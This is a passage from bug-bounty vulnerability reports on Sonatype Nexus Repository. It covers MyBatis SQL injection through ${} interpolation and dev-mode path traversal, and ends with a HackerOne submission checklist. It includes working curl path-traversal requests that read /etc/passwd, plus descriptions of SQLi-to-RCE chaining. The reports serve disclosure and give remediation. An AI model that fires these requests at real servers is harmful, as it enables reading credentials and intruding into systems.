<select id="readContentRepositoryId" resultType="java.util.HashMap" databaseId="PostgreSQL">
    SELECT r.name, cr.repository_id FROM repository r
    INNER JOIN ${repositoryFormat}_content_repository cr ON r.id = cr.config_repository_id
    WHERE r.name = '${repositoryName}'
</select>
```

Highlight: `'${repositoryName}'` — the `${}` notation in MyBatis performs raw string interpolation (no escaping).

### Step 2 — Identify additional vulnerable mappers

Open: `SearchTableDAO.xml` and show:

**Screenshot 2a:** Lines 346–348 — `${componentId}` in foreach loop:
```xml
<foreach collection="componentIds" item="componentId" open="AND component_id IN (" separator="," close=")">
    ${componentId}
</foreach>
```

**Screenshot 2b:** Lines 447, 453 — `${assetFilter}` and `${filter}`:
```xml
(${assetFilter})
...
<if test="filter != null">(${filter})</if>
```

**Screenshot 2c:** Lines 455–456 — `${sortColumnName}` and `${sortDirection}`:
```xml
ORDER BY ... ${sortColumnName} ${sortDirection}
```

### Step 3 — Trace the data flow (source code analysis)

Show that `SqlSearchRequest.java` stores these as plain `String` fields:

```java
public final String filter;         // line 34
public final String assetFilter;    // line 42
public final String sortColumnName; // line 49
public final String sortDirection;  // line 52
```

**Screenshot:** Show `SqlSearchRequest.java` with the String fields.

### Step 4 — Show the difference between safe and unsafe MyBatis

Create a side-by-side comparison:

```xml
<!-- UNSAFE: ${repositoryName} — raw string substitution, SQL injectable -->
WHERE r.name = '${repositoryName}'

<!-- SAFE: #{repositoryName} — parameterized binding, not injectable -->
WHERE r.name = #{repositoryName}
```

**Screenshot:** Show this comparison, highlighting that the unsafe pattern is used throughout the codebase.

### Step 5 — Count all vulnerable `${}` usages in mappers

```bash
cd nexus-public
grep -rn '\${' --include="*DAO.xml" public/ | grep -v 'format}' | grep -v 'namespace}' | grep -v 'UUID_TYPE' | grep -v 'JSON_TYPE' | grep -v 'tokens}' | grep -v 'thePaths}'
```

**Screenshot:** Show the count of potentially dangerous `${}` usages across all DAO mapper files.

## Impact
- **Database compromise:** An attacker who can influence `repositoryName`, `filter`, `sortColumnName`, or `componentId` values can execute arbitrary SQL
- **Data exfiltration:** Extract all user credentials, repository data, and configuration
- **Privilege escalation:** Modify admin credentials or role assignments in the database
- **RCE chain:** Combined with the deserialization finding (Report 6), injecting serialized payloads into Quartz tables via SQLi achieves Remote Code Execution

The `sortColumnName` field is particularly dangerous because sort parameters are commonly exposed in search/list API endpoints and are a well-known blind SQLi vector.

## Supporting Material / References
- `ContentRepositoryDAO.xml` line 82: `'${repositoryName}'`
- `SearchTableDAO.xml` lines 347, 357, 366, 380, 403, 447, 453, 456, 461
- `AssetDAO.xml`: `(${filter})` pattern
- `BrowseNodeDAO.xml`: `(${filter})` and `(${descendantFilter})`
- MyBatis documentation on `${}` vs `#{}`: https://mybatis.org/mybatis-3/sqlmap-xml.html

## Remediation
1. Replace all `'${repositoryName}'` with `#{repositoryName}`.
2. Replace all `${componentId}` in foreach with `#{componentId}`.
3. Implement allowlist validation for `sortColumnName` and `sortDirection`.
4. Audit all MyBatis mappers for remaining `${}` usage and migrate to `#{}`.

---

# REPORT 10: Path Traversal in Dev-Mode Resource Serving

## Title
Path Traversal via Dev-Mode Resource Directories — No Canonicalization or Containment Check

## Severity
**Medium** — CVSS 5.9 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N)

## Vulnerability Type
CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

## Description
When `NEXUS_RESOURCE_DIRS` or `nexus.resource.dirs` is set, HTTP request paths are used to construct file paths via `new File(dir, path)` without any canonicalization or containment validation. An attacker can use `../` sequences to read arbitrary files.

## Steps to Reproduce

### Step 1 — Start Nexus with dev-mode resource dirs enabled

```bash
docker run -d -p 8081:8081 --name nexus-devmode \
  -e NEXUS_RESOURCE_DIRS=/opt/sonatype/nexus/public \
  sonatype/nexus3:3.89.0

sleep 120
```

Or add to `nexus.properties`:
```
nexus.resource.dirs=/opt/sonatype/nexus/public
```

**Screenshot:** Show the configuration with dev-mode resource dirs enabled.

### Step 2 — Request a normal resource to verify dev-mode is active

```bash
curl -v 'http://localhost:8081/static/rapture/bootstrap.js'
```

**Screenshot:** Show that static resources are served from the filesystem.

### Step 3 — Attempt path traversal

```bash
# Try to read /etc/passwd via path traversal
curl -v 'http://localhost:8081/static/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'

# Alternative encoding
curl -v 'http://localhost:8081/static/../../../../etc/passwd'

# Double-encoded
curl -v 'http://localhost:8081/static/..%252F..%252F..%252Fetc%252Fpasswd'
```

**Screenshot:** Show the response. If path traversal succeeds, `/etc/passwd` contents will be returned.

### Step 4 — Show the vulnerable code

Open: `DevModeResources.java` lines 122–132.

**Screenshot:** Highlight that `new File(dir, path)` is called without any check that the resulting file is within `dir`.

## Impact
On any Nexus instance with dev-mode resource directories enabled (common in development/staging):
- Read arbitrary files accessible to the Nexus process user
- Exfiltrate configuration files containing database credentials
- Read the admin password file
- Access TLS private keys if stored on the filesystem

## Supporting Material / References
- `DevModeResources.java` line 125: `File file = new File(dir, path)`
- No `getCanonicalPath()` or prefix validation applied

## Remediation
1. Canonicalize paths: `file.getCanonicalPath().startsWith(dir.getCanonicalPath())`
2. Reject paths containing `..` segments
3. Add prominent warnings that dev-mode is insecure and must never be used in production

---

# Submission Checklist

For each report you submit to HackerOne:

- [ ] Take screenshots at every numbered step
- [ ] Include the Nexus version number in each report (`3.89.0-09`)
- [ ] Reference the specific source code file and line numbers
- [ ] Link to the GitHub repository: https://github.com/sonatype/nexus-public
- [ ] Attach the full `SECURITY_AUDIT_REPORT.md` as supplementary material
- [ ] Set appropriate severity (Critical/High/Medium/Low)
- [ ] Select correct vulnerability type/CWE
- [ ] Include the CVSS score and vector string
- [ ] Describe the impact in business terms (supply chain compromise, RCE, data breach)
- [ ] Provide clear remediation steps

## Recommended Submission Order

Submit in this order (highest impact first):

1. **Report 1** — Groovy RCE (Critical, most dramatic PoC)
2. **Report 9** — SQL Injection (Critical, systemic issue)
3. **Report 6** — Unsafe Deserialization (High, chains with SQLi)
4. **Report 2** — SSRF Proxy (High, default configuration)
5. **Report 3** — SSRF Certificate (High, easy to demonstrate)
6. **Report 4** — Default Credentials (High, well-known but still impactful)
7. **Report 5** — Stored XSS (Medium, clear PoC)
8. **Report 7** — Legacy Hashing (High, requires DB access to prove)
9. **Report 8** — Missing Auth (Low, easy to prove)
10. **Report 10** — Path Traversal (Medium, conditional on dev-mode)

> **Important:** Some of these may be known issues or accepted risks by Sonatype. Check if Sonatype has a HackerOne program or responsible disclosure policy at https://www.sonatype.com/report-a-security-vulnerability before submitting.
